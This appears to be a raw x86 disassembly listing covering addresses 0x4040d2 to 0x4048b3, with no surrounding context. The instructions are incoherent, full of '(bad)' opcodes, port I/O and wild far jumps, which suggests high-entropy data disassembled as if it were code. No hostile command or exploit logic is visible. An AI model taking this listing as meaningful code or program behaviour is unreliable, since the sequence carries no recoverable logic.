  4040d2:	test   BYTE PTR [ebp+0x48],bh
  4040d5:	hlt    
  4040d6:	int    0xcf
  4040d8:	in     al,dx
  4040d9:	jge    0x404106
  4040db:	adc    al,BYTE PTR [esi-0x77]
  4040de:	stos   BYTE PTR es:[edi],al
  4040df:	jle    0x4040e5
  4040e1:	out    dx,eax
  4040e2:	xor    ecx,0x8f800591
  4040e8:	xor    al,0xf9
  4040ea:	adc    dh,BYTE PTR [esi]
  4040ec:	xchg   ebx,eax
  4040ed:	into   
  4040ee:	aaa    
  4040ef:	cmp    ebp,DWORD PTR [ebx+0x237690c]
  4040f5:	cmc    
  4040f6:	adc    edx,DWORD PTR [ebx]
  4040f8:	jae    0x40410d
  4040fa:	emms   
  4040fc:	jo     0x4040d6
  4040fe:	out    dx,al
  4040ff:	mov    bh,cl
  404101:	add    ecx,DWORD PTR [ecx+edx*2-0xe]
  404105:	mov    ah,0xe1
  404107:	push   ds
  404108:	mov    ch,0x53
  40410a:	shl    BYTE PTR [edx-0x51],1
  40410d:	neg    BYTE PTR [ebp+0x12]
  404110:	jp     0x404173
  404112:	xor    esi,DWORD PTR [edx]
  404114:	rcr    BYTE PTR [ebx+0x6dde79b1],0xb0
  40411b:	enter  0x5a7,0x27
  40411f:	xor    DWORD PTR [edx],0x8b9af4b1
  404125:	repnz push edx
  404127:	int    0x35
  404129:	outs   dx,DWORD PTR ds:[esi]
  40412a:	ret    0xca1d
  40412d:	stos   BYTE PTR es:[edi],al
  40412e:	mov    bl,0xe7
  404130:	jo     0x40410b
  404132:	call   0xe4d0e80a
  404137:	and    dh,ah
  404139:	xchg   DWORD PTR [ebp-0x48],ebx
  40413c:	sahf   
  40413d:	push   eax
  40413e:	daa    
  40413f:	jg     0x404116
  404141:	mov    gs,WORD PTR [edx]
  404143:	dec    ebx
  404144:	xlat   BYTE PTR ds:[ebx]
  404145:	loopne 0x4041b4
  404147:	(bad)  
  404148:	xlat   BYTE PTR ds:[ebx]
  404149:	enter  0xacb9,0x7c
  40414d:	pop    esp
  40414e:	js     0x4040ec
  404150:	(bad)  
  404151:	stos   DWORD PTR es:[edi],eax
  404152:	dec    esi
  404153:	xchg   ebp,eax
  404154:	xchg   edx,eax
  404155:	hlt    
  404156:	pop    es
  404157:	addr16 mov ecx,0xdf014b88
  40415d:	adc    DWORD PTR [edx-0x6b],esp
  404160:	mov    ebp,DWORD PTR ss:[eax-0x2247f40]
  404167:	push   es
  404168:	fdiv   st(5),st
  40416a:	pop    es
  40416b:	cmc    
  40416c:	sahf   
  40416d:	popf   
  40416e:	js     0x40414d
  404170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404171:	lahf   
  404172:	scas   al,BYTE PTR es:[edi]
  404173:	mov    esi,0x101e0354
  404178:	push   ds
  404179:	sub    al,0x3
  40417b:	pop    esi
  40417c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40417d:	mov    dl,0x0
  40417f:	sbb    BYTE PTR [edi-0x9b58f4f],al
  404185:	scas   eax,DWORD PTR es:[edi]
  404186:	arpl   WORD PTR [edx-0x46],sp
  404189:	lds    esi,FWORD PTR [ecx+0x65]
  40418c:	cmp    BYTE PTR ds:0x5331aa01,ch
  404192:	adc    bh,cl
  404194:	sub    eax,0x157ef2af
  404199:	in     eax,0x33
  40419b:	adc    bl,BYTE PTR [ebx*2-0x66261698]
  4041a2:	int    0xea
  4041a4:	pop    ecx
  4041a5:	and    BYTE PTR [esi+edx*4+0x2d3c5947],bl
  4041ac:	pop    edi
  4041ad:	cmc    
  4041ae:	std    
  4041af:	cwde   
  4041b0:	stc    
  4041b1:	gs jg  0x4041aa
  4041b4:	fnstenv [ebp+0x8]
  4041b7:	inc    eax
  4041b8:	or     edi,DWORD PTR [eax-0x795ee4b8]
  4041be:	mov    ah,0x32
  4041c0:	lds    eax,FWORD PTR [edi]
  4041c2:	adc    bl,0x80
  4041c5:	pop    eax
  4041c6:	pusha  
  4041c7:	adc    eax,0x1962189c
  4041cc:	sub    eax,0x58351b81
  4041d1:	jge    0x404198
  4041d3:	cld    
  4041d4:	ret    0x24ed
  4041d7:	mov    al,ds:0xa7656e0a
  4041dc:	inc    esi
  4041dd:	xor    eax,0xc375601d
  4041e2:	adc    DWORD PTR [ebx+0x47],ecx
  4041e5:	scas   eax,DWORD PTR es:[edi]
  4041e6:	xchg   ebx,eax
  4041e7:	adc    al,0xa
  4041e9:	dec    eax
  4041ea:	dec    esi
  4041eb:	clc    
  4041ec:	or     BYTE PTR [edx-0x401ce4ba],dh
  4041f2:	lock jnp 0x404208
  4041f5:	xor    cl,al
  4041f7:	loop   0x404217
  4041f9:	xchg   edi,eax
  4041fa:	adc    al,0x30
  4041fc:	cdq    
  4041fd:	out    0x27,al
  4041ff:	outs   dx,BYTE PTR ds:[esi]
  404200:	add    ebp,0x340fcb1f
  404206:	cdq    
  404207:	cli    
  404208:	out    dx,eax
  404209:	ss jle 0x4041b2
  40420c:	mov    BYTE PTR [edx+0x18cf30a2],ch
  404212:	call   0x2ae3:0x7485194
  404219:	pop    esi
  40421a:	mov    al,0x87
  40421c:	inc    ebx
  40421d:	jnp    0x404284
  40421f:	push   ss
  404220:	jbe    0x4041a6
  404222:	imul   esi,DWORD PTR [esi-0x50],0xffffffdf
  404226:	jmp    0x40426f
  404228:	aam    0xb
  40422a:	enter  0xb59d,0xf6
  40422e:	inc    esi
  40422f:	rol    BYTE PTR [esi-0x42c12fe9],1
  404235:	popf   
  404236:	stos   BYTE PTR es:[edi],al
  404237:	push   esp
  404238:	mov    ch,0xac
  40423a:	jl     0x40427c
  40423c:	es jo  0x40422f
  40423f:	dec    esp
  404240:	ret    
  404241:	fidiv  WORD PTR [esi]
  404243:	cmp    eax,0xa487c89b
  404248:	out    dx,al
  404249:	lea    ebx,[ebx-0x7c874eb4]
  40424f:	inc    ebx
  404250:	push   ecx
  404251:	lock mov ecx,0x315686a1
  404257:	or     dh,BYTE PTR [esi]
  404259:	and    BYTE PTR [ebp+0x16],cl
  40425c:	xor    DWORD PTR [edi],ebx
  40425e:	call   0x3ad3:0x17b59686
  404265:	rcr    DWORD PTR [edi+0x18814233],0x84
  40426c:	jns    0x404260
  40426e:	retf   0x381b
  404271:	add    BYTE PTR [esi+0x876fb17],dl
  404277:	jle    0x404254
  404279:	scas   al,BYTE PTR es:[edi]
  40427a:	inc    eax
  40427b:	ret    
  40427c:	add    al,0x3a
  40427e:	fmul   st(7),st
  404280:	xor    esp,edx
  404282:	mov    eax,0xc130afe7
  404287:	ret    
  404288:	push   ecx
  404289:	pop    ss
  40428a:	pop    edi
  40428b:	out    dx,eax
  40428c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40428d:	pop    esp
  40428e:	sahf   
  40428f:	loop   0x4042f6
  404291:	cmp    edx,DWORD PTR [edx-0x9]
  404294:	or     eax,0xde3537d3
  404299:	mov    ah,0xd9
  40429b:	mov    DWORD PTR [ebp+0x3f],edx
  40429e:	sub    dh,BYTE PTR [ebp-0x1c]
  4042a1:	nop
  4042a2:	xor    bh,BYTE PTR [ecx+0x47]
  4042a5:	jmp    0x40423f
  4042a7:	rol    DWORD PTR [esi-0x1c567165],1
  4042ad:	cmp    al,0x22
  4042af:	sub    al,0xf4
  4042b1:	rol    al,cl
  4042b3:	mov    al,0x49
  4042b5:	mov    eax,ds:0x1f47c565
  4042ba:	dec    ecx
  4042bb:	jl     0x4042b9
  4042bd:	add    ah,BYTE PTR [ecx-0x1e5745f2]
  4042c3:	mov    edi,DWORD PTR [eax-0x634d8f2f]
  4042c9:	leave  
  4042ca:	mov    eax,0xebd2065d
  4042cf:	enter  0x2b76,0xa4
  4042d3:	test   DWORD PTR [edi],edi
  4042d5:	push   ecx
  4042d6:	sub    BYTE PTR [ecx-0xa5c4ca4],al
  4042dc:	xchg   ch,ah
  4042de:	lods   al,BYTE PTR ds:[esi]
  4042df:	push   edi
  4042e0:	loop   0x404350
  4042e2:	pop    ss
  4042e3:	call   0xf12164f4
  4042e8:	loop   0x40435f
  4042ea:	xchg   DWORD PTR cs:[ecx],edx
  4042ed:	or     al,0xa3
  4042ef:	arpl   sp,sp
  4042f1:	jbe    0x404339
  4042f3:	into   
  4042f4:	inc    esi
  4042f5:	jle    0x404312
  4042f7:	or     eax,0x3f7a3759
  4042fc:	inc    ebp
  4042fd:	jno    0x40437d
  4042ff:	fstp   DWORD PTR [edi-0x5107913f]
  404305:	rcl    DWORD PTR [esi+0x975c4ec],0xa8
  40430c:	xor    eax,0xc5f8ddf9
  404311:	cmp    edx,DWORD PTR [ebx-0x524472eb]
  404317:	push   edx
  404318:	lock mov edi,0x24dacc96
  40431e:	fnstcw WORD PTR [edx+esi*8]
  404321:	push   esp
  404322:	fld    QWORD PTR [edi]
  404324:	xchg   ebp,eax
  404325:	xchg   ebx,eax
  404326:	sbb    BYTE PTR [ecx+edx*4+0x6a899e14],dh
  40432d:	xchg   esp,eax
  40432e:	and    ah,al
  404330:	dec    esi
  404331:	stc    
  404332:	bound  ecx,QWORD PTR [ecx+0x54]
  404335:	dec    eax
  404336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404337:	xor    edi,DWORD PTR [ebp+0x14]
  40433a:	imul   DWORD PTR [ecx]
  40433c:	and    eax,0xf4f6c644
  404341:	xor    ebx,esp
  404343:	into   
  404344:	mov    eax,0xc47ecf0c
  404349:	mov    ebx,0xdfd1d047
  40434e:	repz sub eax,0x8d35c8e8
  404354:	cmp    ch,BYTE PTR [edx-0x3f]
  404357:	jg     0x404343
  404359:	scas   al,BYTE PTR es:[edi]
  40435a:	dec    eax
  40435b:	push   es
  40435c:	sub    DWORD PTR [edx+0x6f],esp
  40435f:	ret    0x3d5c
  404362:	shl    DWORD PTR [ecx-0x6d],cl
  404365:	mov    edx,0xa03e4b20
  40436a:	mov    dh,0x5d
  40436c:	data16 lahf 
  40436e:	or     eax,0x47e611ce
  404373:	cmc    
  404374:	sub    DWORD PTR [esi+0x7ad93f4],eax
  40437a:	inc    esi
  40437b:	shl    eax,0x35
  40437e:	fs (bad) 
  404380:	and    DWORD PTR [ebx],0x75
  404383:	ins    DWORD PTR es:[edi],dx
  404384:	scas   eax,DWORD PTR es:[edi]
  404385:	dec    esp
  404386:	bound  esi,QWORD PTR [edx-0x5f]
  404389:	jge    0x404403
  40438b:	hlt    
  40438c:	pop    es
  40438d:	sbb    edi,DWORD PTR [ebx+edi*8]
  404390:	lahf   
  404391:	das    
  404392:	or     al,0x9c
  404394:	or     ecx,esp
  404396:	and    DWORD PTR [ebp+edx*2+0x23bad7c2],edx
  40439d:	pop    ds
  40439e:	add    DWORD PTR [eax],eax
  4043a0:	icebp  
  4043a1:	xchg   ah,dh
  4043a3:	adc    DWORD PTR [edx-0x27],esi
  4043a6:	int3   
  4043a7:	mov    ds:0x2856e047,al
  4043ac:	enter  0xeeb9,0x36
  4043b0:	sbb    ecx,ebp
  4043b2:	stos   DWORD PTR es:[edi],eax
  4043b3:	outs   dx,DWORD PTR ds:[esi]
  4043b4:	daa    
  4043b5:	push   ebp
  4043b6:	mov    ch,0x1d
  4043b8:	pop    ebp
  4043b9:	add    eax,0xffffffc0
  4043bc:	pop    edx
  4043bd:	add    al,BYTE PTR [edx+0x1caa7668]
  4043c3:	xchg   ebp,eax
  4043c4:	dec    ecx
  4043c5:	sub    eax,0x3bc6f7e7
  4043ca:	sahf   
  4043cb:	outs   dx,BYTE PTR ds:[esi]
  4043cc:	fs jmp 0x40443d
  4043cf:	pop    ebp
  4043d0:	adc    BYTE PTR [esi],dl
  4043d2:	jb     0x404430
  4043d4:	dec    ebx
  4043d5:	inc    edi
  4043d6:	push   0x9c678974
  4043db:	ret    0xf871
  4043de:	addr16 inc edi
  4043e0:	push   ds
  4043e1:	rcr    BYTE PTR ds:0xbefac1d2,1
  4043e7:	xchg   ecx,eax
  4043e8:	mov    esi,0x85fb4e9e
  4043ed:	das    
  4043ee:	popa   
  4043ef:	pop    ecx
  4043f0:	mov    dh,cl
  4043f2:	shr    edx,cl
  4043f4:	and    al,0x49
  4043f6:	icebp  
  4043f7:	jb     0x40444d
  4043f9:	mov    esi,0x2ecd2b6c
  4043fe:	or     eax,0xddf1a281
  404403:	shr    DWORD PTR cs:[ecx-0x5c],1
  404407:	ins    DWORD PTR es:[edi],dx
  404408:	pop    edx
  404409:	xchg   ebp,eax
  40440a:	cs pop ds
  40440c:	lock imul eax,DWORD PTR [esi-0x55],0xffffffdd
  404411:	lahf   
  404412:	retf   
  404413:	mov    eax,0xda07e5a9
  404418:	pop    ds
  404419:	call   0x88b8:0x101e23bb
  404420:	dec    edx
  404421:	xor    cl,BYTE PTR ds:0x57dc94ca
  404427:	push   esp
  404428:	out    dx,eax
  404429:	std    
  40442a:	xor    eax,0x55294fdd
  40442f:	adc    BYTE PTR [edi-0x66663bb0],bl
  404435:	xchg   esi,eax
  404436:	or     ebp,DWORD PTR [ecx+0x26]
  404439:	dec    ebx
  40443a:	xchg   BYTE PTR [esi-0x63],ah
  40443d:	mov    ds:0x2606b406,eax
  404442:	mov    ebp,0x5b724dc4
  404447:	add    DWORD PTR [ebp+0x4ee1b8d6],esp
  40444d:	inc    esi
  40444e:	test   eax,0x932248d1
  404453:	stos   BYTE PTR es:[edi],al
  404454:	imul   edx,esp,0xffffffd8
  404457:	ret    0xc313
  40445a:	cmp    eax,0x26be593b
  40445f:	dec    ebp
  404460:	jle    0x4044b9
  404462:	jge    0x4043f7
  404464:	fsubp  st(1),st
  404466:	mov    ss,WORD PTR [eax]
  404468:	lods   eax,DWORD PTR ds:[esi]
  404469:	xchg   esp,eax
  40446a:	in     al,dx
  40446b:	jmp    0x4d62bfe5
  404470:	cdq    
  404471:	stos   DWORD PTR es:[edi],eax
  404472:	cmp    BYTE PTR [ecx+0x2551218b],cl
  404478:	sub    eax,0x190ef9fd
  40447d:	pop    ebx
  40447e:	shl    BYTE PTR [esi-0x44],cl
  404481:	mov    eax,DWORD PTR [ebp-0x710c6e04]
  404487:	fld    TBYTE PTR [ebp-0x2]
  40448a:	pop    eax
  40448b:	pop    esp
  40448c:	xchg   edx,eax
  40448d:	xor    DWORD PTR [ebp-0x29],ebp
  404490:	and    ah,dh
  404492:	(bad)  
  404493:	jb     0x4044c3
  404495:	outs   dx,BYTE PTR ds:[esi]
  404496:	cld    
  404497:	cmp    BYTE PTR [ebp-0x330354cc],al
  40449d:	fmul   st,st(1)
  40449f:	jb     0x404519
  4044a1:	imul   ecx,DWORD PTR [edi],0xfffffff0
  4044a4:	loopne 0x4044c5
  4044a6:	call   0xee7a684b
  4044ab:	jnp    0x404457
  4044ad:	sbb    eax,0x670c1abc
  4044b2:	mov    DWORD PTR [ebx-0x7b],esi
  4044b5:	adc    esi,DWORD PTR ds:0x3589543f
  4044bb:	dec    esi
  4044bc:	add    edi,DWORD PTR [eax-0x5c84bc7e]
  4044c2:	test   dh,ah
  4044c4:	adc    esp,DWORD PTR [esp+eax*2-0x3b52b323]
  4044cb:	jne    0x404538
  4044cd:	nop
  4044ce:	popf   
  4044cf:	add    esi,DWORD PTR [edx+0x33]
  4044d2:	int3   
  4044d3:	add    ebp,esp
  4044d5:	pop    ebp
  4044d6:	pushfw 
  4044d8:	pop    ds
  4044d9:	xor    al,0x11
  4044db:	mov    ch,0xd9
  4044dd:	jecxz  0x404473
  4044df:	dec    ecx
  4044e0:	mov    ebx,0xf7529eef
  4044e5:	jb     0x4044b5
  4044e7:	jbe    0x404561
  4044e9:	cld    
  4044ea:	les    eax,FWORD PTR [eax+0x53]
  4044ed:	int3   
  4044ee:	xchg   esp,eax
  4044ef:	pop    ds
  4044f0:	inc    edx
  4044f1:	retf   0x68ca
  4044f4:	aad    0x4f
  4044f6:	add    dh,ch
  4044f8:	jae    0x404549
  4044fa:	xchg   esp,eax
  4044fb:	inc    esp
  4044fc:	add    al,0x73
  4044fe:	mov    ecx,0xc057dda8
  404503:	fidiv  DWORD PTR [eax]
  404505:	xchg   esp,eax
  404506:	jmp    0x4044d1
  404508:	test   al,0xec
  40450a:	inc    esi
  40450b:	mov    cl,0xad
  40450d:	aas    
  40450e:	mov    bh,0xf5
  404510:	in     al,dx
  404511:	mul    BYTE PTR [esi+0x57e365f7]
  404517:	es mov ah,0xc3
  40451a:	int    0x38
  40451c:	pop    edx
  40451d:	das    
  40451e:	jnp    0x404586
  404520:	fsubrp st(6),st
  404522:	scas   al,BYTE PTR es:[edi]
  404523:	out    dx,al
  404524:	add    DWORD PTR [edx-0x55598a7c],ebx
  40452a:	loop   0x40459c
  40452c:	cwde   
  40452d:	data16 fist WORD PTR fs:[esi]
  404531:	and    eax,0xeb9fea7f
  404536:	lods   eax,DWORD PTR ds:[esi]
  404537:	adc    dl,bh
  404539:	iret   
  40453a:	pop    edi
  40453b:	test   BYTE PTR [ebx+0x60cd69af],ch
  404541:	pop    ebx
  404542:	push   cs
  404543:	cmp    eax,0x5a727a91
  404548:	ffree  st(3)
  40454a:	mov    ebx,0xc2fbc9e4
  40454f:	mov    cs,WORD PTR [edi-0x4a]
  404552:	push   edi
  404553:	jno    0x4044ec
  404555:	inc    esp
  404556:	call   0x41a0:0xd66282e5
  40455d:	imul   ecx,DWORD PTR [esp+esi*8+0x3],0x8007b501
  404565:	fsubrp st(6),st
  404567:	int    0xf1
  404569:	pop    edx
  40456a:	(bad)  
  40456b:	in     eax,0xc2
  40456d:	mov    ds:0xc346b7e2,eax
  404572:	inc    ebx
  404573:	xor    ch,cl
  404575:	mov    cl,0x3b
  404577:	sub    al,0x8
  404579:	mov    ds:0x75a0f283,al
  40457e:	mov    esi,0xc3765980
  404583:	lds    ebx,FWORD PTR [edx]
  404585:	test   al,0xd3
  404587:	xchg   al,bh
  404589:	int    0x8
  40458b:	xor    edi,ebx
  40458d:	cdq    
  40458e:	call   0x9fe9:0x2db960f0
  404595:	jecxz  0x404520
  404597:	mov    al,ds:0x401ae5b4
  40459c:	loop   0x404554
  40459e:	les    edi,FWORD PTR [edx-0x51de3108]
  4045a4:	dec    edx
  4045a5:	ror    edx,cl
  4045a7:	hlt    
  4045a8:	pop    ebx
  4045a9:	pop    esi
  4045aa:	add    eax,0x32076aca
  4045af:	repnz cdq 
  4045b1:	(bad)  
  4045b2:	dec    edi
  4045b3:	xor    edi,ebx
  4045b5:	sbb    edi,eax
  4045b7:	jl     0x4045e8
  4045b9:	mov    dh,0x82
  4045bb:	scas   eax,DWORD PTR es:[edi]
  4045bc:	xor    BYTE PTR [ebp-0x21],ch
  4045bf:	cmp    esi,DWORD PTR [esi-0x3d]
  4045c2:	sub    edx,esi
  4045c4:	jno    0x404566
  4045c6:	sbb    BYTE PTR [esi+ecx*1+0x6b],0x7e
  4045cb:	not    ah
  4045cd:	mov    ds:0x26988351,al
  4045d2:	fsub   st(6),st
  4045d4:	push   edi
  4045d5:	outs   dx,BYTE PTR ds:[esi]
  4045d6:	outs   dx,BYTE PTR ds:[esi]
  4045d7:	(bad)  
  4045d9:	repnz ins DWORD PTR es:[edi],dx
  4045db:	into   
  4045dc:	sub    BYTE PTR [eax+0xcb6eeb9],ch
  4045e2:	out    0x9,eax
  4045e4:	add    BYTE PTR [ebp+eax*2-0x5c3767de],dh
  4045eb:	lods   al,BYTE PTR cs:[esi]
  4045ed:	lock fdiv st,st(0)
  4045f0:	dec    eax
  4045f1:	fidiv  WORD PTR [ecx]
  4045f3:	ror    BYTE PTR [esi+0x49],cl
  4045f6:	xchg   esp,eax
  4045f7:	icebp  
  4045f8:	js     0x4045e8
  4045fa:	shl    ebx,0x80
  4045fd:	pop    ss
  4045fe:	icebp  
  4045ff:	xor    ecx,DWORD PTR [eax-0x28]
  404602:	lea    ebx,[eax+0x78]
  404605:	repnz sahf 
  404607:	mov    eax,ds:0x710b5f56
  40460c:	mov    dl,BYTE PTR ds:0xf4a5162a
  404612:	sub    BYTE PTR [esi+0x56b02e6],0xa7
  404619:	je     0x4045af
  40461b:	dec    edi
  40461c:	dec    esi
  40461d:	ror    DWORD PTR [edi+ebx*2-0x16376053],1
  404624:	add    eax,0x684c4abe
  404629:	dec    esp
  40462a:	push   ebx
  40462b:	div    DWORD PTR ds:0xb9c6b9ae
  404631:	push   edx
  404632:	pop    ss
  404633:	out    0x97,al
  404635:	stos   DWORD PTR es:[edi],eax
  404636:	enter  0xb08b,0x40
  40463a:	sbb    ah,BYTE PTR [ecx]
  40463c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40463d:	add    bl,BYTE PTR [edx+edi*2-0xbe35251]
  404644:	bound  edi,QWORD PTR [edi+0x38]
  404647:	xor    cl,0xc6
  40464a:	sub    DWORD PTR [ebx+0x1e],eax
  40464d:	lock shr DWORD PTR [ebx+0x48],cl
  404651:	push   edi
  404652:	sbb    bh,bl
  404654:	(bad)  
  404655:	jmp    0x404678
  404657:	mov    dh,0x7
  404659:	mov    bh,0xfe
  40465b:	adc    al,0xad
  40465d:	push   ecx
  40465e:	sbb    al,0xaa
  404660:	(bad)  
  404661:	pop    edi
  404662:	push   edi
  404663:	repnz fnstsw WORD PTR [eax-0x6a]
  404667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404668:	in     al,dx
  404669:	cmp    BYTE PTR [ecx+0x5869e7c1],cl
  40466f:	pop    es
  404670:	imul   eax,DWORD PTR [edi],0xfc9f9f82
  404676:	inc    ebx
  404677:	fsubr  QWORD PTR ds:0x31c40608
  40467d:	mov    dh,0xf
  40467f:	jno    0x4046cd
  404681:	and    esi,DWORD PTR [ebx+0x65]
  404684:	jl     0x404648
  404686:	dec    ecx
  404687:	pop    ebx
  404688:	mov    edi,0xc34c7d7e
  40468d:	xchg   esp,eax
  40468e:	lock inc eax
  404690:	sbb    esi,DWORD PTR [eax+0x24]
  404693:	bound  ebx,QWORD PTR [eax]
  404695:	dec    edx
  404696:	add    BYTE PTR [edi-0x2634fa3c],bl
  40469c:	test   dh,ch
  40469e:	xor    al,0x55
  4046a0:	je     0x404694
  4046a2:	(bad)  
  4046a3:	cwde   
  4046a4:	mov    ebx,0x379187c6
  4046a9:	dec    eax
  4046aa:	inc    esp
  4046ab:	js     0x404679
  4046ad:	cmp    ch,0x2c
  4046b0:	in     eax,0x91
  4046b2:	imul   esp,DWORD PTR ss:[edi-0x1],0xffffffc6
  4046b7:	shr    BYTE PTR [edx+0x22eb585c],1
  4046bd:	out    dx,eax
  4046be:	lahf   
  4046bf:	gs retf 
  4046c1:	(bad)  [esi+0x60c0ffce]
  4046c7:	sub    bl,BYTE PTR [ecx-0x1]
  4046ca:	push   ds
  4046cb:	mov    al,0x16
  4046cd:	lds    ebx,FWORD PTR [edx+0x3e2f060c]
  4046d3:	sub    ecx,DWORD PTR [esi-0x4a]
  4046d6:	sub    al,0xeb
  4046d8:	cmp    esi,ebx
  4046da:	jl     0x4046bf
  4046dc:	mov    edi,0x59b73a21
  4046e1:	inc    esi
  4046e2:	out    dx,al
  4046e3:	or     dl,BYTE PTR [eax+0x16]
  4046e6:	adc    ebp,DWORD PTR [ebx+0x27b02f3f]
  4046ec:	fld    QWORD PTR [esi+0x1aed803e]
  4046f2:	frstor [esp+eax*2-0x55]
  4046f6:	push   eax
  4046f7:	loope  0x4046ca
  4046f9:	out    dx,al
  4046fa:	out    0x1a,eax
  4046fc:	and    DWORD PTR ds:0x89bc9fa4,edx
  404702:	mov    cl,0xb0
  404705:	pop    esp
  404706:	out    0x35,al
  404708:	std    
  404709:	jae    0x40474f
  40470b:	pminsw mm5,QWORD PTR [ebx]
  40470e:	mov    al,0x7b
  404710:	xchg   ebx,eax
  404711:	adc    al,0xfe
  404713:	pop    ss
  404714:	ja     0x404705
  404716:	dec    ecx
  404717:	lock push esi
  404719:	div    BYTE PTR [ecx+0x76]
  40471c:	(bad)  
  40471d:	mov    ecx,ss
  40471f:	and    al,0x66
  404721:	jg     0x4046f9
  404723:	out    0x1,eax
  404725:	rcl    DWORD PTR [eax+esi*8-0x16],0xfc
  40472a:	lds    esi,FWORD PTR [edx+eiz*4+0x43]
  40472e:	fild   WORD PTR [ecx]
  404730:	out    0x8f,eax
  404732:	adc    al,0x4f
  404734:	cmp    bh,BYTE PTR [ebp+0x41]
  404737:	jle    0x4046e3
  404739:	mov    bh,0xb
  40473b:	push   ecx
  40473c:	xor    esp,DWORD PTR [ebp-0x4e504f5f]
  404742:	cmp    eax,0x17cfe2e2
  404747:	jb     0x404751
  404749:	or     BYTE PTR [esi+0x327cc6e5],ah
  40474f:	push   esp
  404750:	inc    esp
  404751:	jmp    0x28a3:0xd1dc76c5
  404758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404759:	stos   BYTE PTR es:[edi],al
  40475a:	push   esi
  40475b:	lea    ebp,ds:0xd89a8045
  404761:	inc    eax
  404762:	test   ah,ah
  404764:	(bad)  
  404765:	stc    
  404766:	test   al,0x69
  404768:	xlat   BYTE PTR ds:[ebx]
  404769:	test   DWORD PTR [esi],edx
  40476b:	mov    edx,0x740468f5
  404770:	push   ebp
  404771:	xlat   BYTE PTR ds:[ebx]
  404772:	ins    BYTE PTR es:[edi],dx
  404773:	push   ebp
  404774:	or     al,0x18
  404776:	stos   DWORD PTR es:[edi],eax
  404777:	cmp    cl,BYTE PTR [edi]
  404779:	and    ch,BYTE PTR [edx-0x516bbab]
  40477f:	jns    0x40479c
  404781:	in     eax,0x90
  404783:	pushf  
  404784:	cmp    al,0xd
  404786:	je     0x404771
  404788:	adc    BYTE PTR [eax],bl
  40478a:	mov    ch,0x85
  40478c:	xchg   esp,eax
  40478d:	jmp    0x4feb:0xc2db1096
  404794:	retf   
  404795:	hlt    
  404796:	iret   
  404797:	mov    ecx,0x957a51a0
  40479c:	fnstcw WORD PTR ss:[edx-0x2c60a68f]
  4047a3:	inc    eax
  4047a4:	pop    ds
  4047a5:	jecxz  0x4047e9
  4047a7:	adc    al,0xf2
  4047a9:	int    0x68
  4047ab:	sahf   
  4047ac:	ret    
  4047ad:	adc    eax,0x75f41818
  4047b2:	pop    ds
  4047b3:	frstor [ebp+0x35]
  4047b6:	stos   BYTE PTR es:[edi],al
  4047b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047b8:	lods   al,BYTE PTR ds:[esi]
  4047b9:	js     0x404767
  4047bb:	adc    DWORD PTR [edx+0x17],ecx
  4047be:	jg     0x404786
  4047c0:	dec    ebx
  4047c1:	iret   
  4047c2:	sti    
  4047c3:	or     bl,cl
  4047c5:	sahf   
  4047c6:	or     BYTE PTR [edx+esi*4],ah
  4047c9:	jne    0x4047ab
  4047cb:	jmp    0x40481b
  4047cd:	loope  0x4047db
  4047cf:	jmp    0xc452:0xa5f9003b
  4047d6:	stos   BYTE PTR es:[edi],al
  4047d7:	xor    BYTE PTR [ecx],0xbc
  4047da:	xchg   ebp,eax
  4047db:	and    eax,0x9ad223c9
  4047e0:	data16 sub BYTE PTR [eax-0xf5d23d7],0x36
  4047e8:	xlat   BYTE PTR ds:[ebx]
  4047e9:	imul   ecx,ebp,0xac244de2
  4047ef:	sbb    ah,BYTE PTR [ebx-0x70a7009c]
  4047f5:	push   ebx
  4047f6:	cdq    
  4047f7:	jmp    0xe8fc:0x7c6d8d4a
  4047fe:	jns    0x40479a
  404800:	gs sub ecx,eax
  404803:	(bad)  
  404804:	clc    
  404805:	gs cmp al,0x46
  404808:	xlat   BYTE PTR ds:[ebx]
  404809:	cmc    
  40480a:	lock (bad) [ecx]
  40480d:	clc    
  40480e:	xchg   esi,eax
  40480f:	fisttp WORD PTR ds:0x6037e42a
  404815:	mov    DWORD PTR [esi+ebp*2],ecx
  404818:	fmul   QWORD PTR [ebx+0x17cf1e80]
  40481e:	(bad)
  404823:	sbb    eax,0xad33c1d1
  404828:	mov    ah,0x65
  40482a:	add    eax,0x4efc4da2
  40482f:	pop    ebp
  404830:	sub    eax,0x3c549a9f
  404835:	out    0xdc,al
  404837:	xchg   edi,eax
  404838:	dec    ebp
  404839:	sti    
  40483a:	and    esp,ecx
  40483c:	call   0x917ec9d0
  404841:	call   0xc17640c4
  404846:	mov    ebx,0x7dbe0e2d
  40484b:	or     eax,0x97b288a9
  404850:	jle    0x404839
  404852:	aaa    
  404853:	adc    eax,0x7345ac6d
  404858:	inc    ecx
  404859:	aaa    
  40485a:	out    dx,eax
  40485b:	popa   
  40485c:	out    dx,al
  40485d:	mov    edi,0xf6e668c8
  404862:	int    0x9f
  404864:	pop    DWORD PTR [ebx]
  404866:	aaa    
  404867:	ins    DWORD PTR es:[edi],dx
  404868:	or     al,0x73
  40486a:	pop    ebp
  40486b:	fst    QWORD PTR [ecx-0x5b085750]
  404871:	and    dh,BYTE PTR [esi-0x15891b02]
  404877:	scas   eax,DWORD PTR es:[edi]
  404878:	or     esi,DWORD PTR [edi+esi*1+0x43]
  40487c:	mov    esi,DWORD PTR [eax-0x2a48fc68]
  404882:	mov    ebx,DWORD PTR [esi-0x3]
  404885:	dec    edi
  404886:	test   DWORD PTR [eax],ebx
  404888:	test   BYTE PTR [edx-0x54668df7],dh
  40488e:	outs   dx,DWORD PTR ds:[esi]
  40488f:	loopne 0x404858
  404891:	shl    eax,1
  404893:	add    ebx,DWORD PTR [edx]
  404895:	jns    0x4048c7
  404897:	aas    
  404898:	mov    eax,ds:0x63945b52
  40489d:	xchg   BYTE PTR [esi],cl
  40489f:	aad    0x74
  4048a1:	mov    dl,0x5f
  4048a3:	jmp    0xf08a:0x63c92d18
  4048aa:	adc    edi,edi
  4048ac:	outs   dx,DWORD PTR ds:[esi]
  4048ad:	and    ebp,DWORD PTR [edi]
  4048af:	jbe    0x404831
  4048b1:	(bad)  
  4048b2:	inc    esp
  4048b3:	in     eax,dx
